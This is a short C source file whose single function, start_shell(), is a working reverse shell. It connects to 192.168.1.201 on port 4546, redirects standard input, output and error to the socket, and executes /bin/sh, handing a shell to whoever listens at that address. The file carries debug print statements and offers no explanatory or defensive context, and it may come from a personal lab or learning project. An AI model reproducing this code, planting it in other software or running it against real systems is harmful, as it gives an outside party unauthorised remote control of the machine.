#include "rs.h"

bool start_shell(){
    printf("shell start\n");
    int fd = socket(AF_INET,SOCK_STREAM,0);
    printf("debug2\n");
    if (fd < 0) perror("rs socket");

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(4546);

    inet_pton(AF_INET, "192.168.1.201", &dest.sin_addr);
    printf("debug3\n");
    
    int cnt_check = connect(fd, (struct sockaddr *)&dest, sizeof(dest));
    if (cnt_check == 0) printf("connect success\n");
    if (cnt_check < 0) perror("connect\n");

    printf("\n");

    dup2(fd,0);
    dup2(fd,1);
    dup2(fd,2);

    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    close(fd);
}